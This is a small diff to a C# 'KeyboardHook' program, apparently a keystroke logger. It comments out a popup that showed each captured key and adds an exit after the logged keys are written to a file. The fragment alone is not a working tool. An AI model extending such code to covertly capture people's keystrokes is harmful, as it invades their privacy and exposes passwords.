@@ -41,7 +41,7 @@ namespace KeyboardHook
         {
 
 
-            MessageBox.Show(e.KeyChar.ToString());
+         //   MessageBox.Show(e.KeyChar.ToString());
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -83,6 +83,9 @@ namespace KeyboardHook
                         sr.WriteLine(hook + "\r\n");
                         sr.Close();
                     }
+
+       
+                Application.Exit();
             }
         }
 
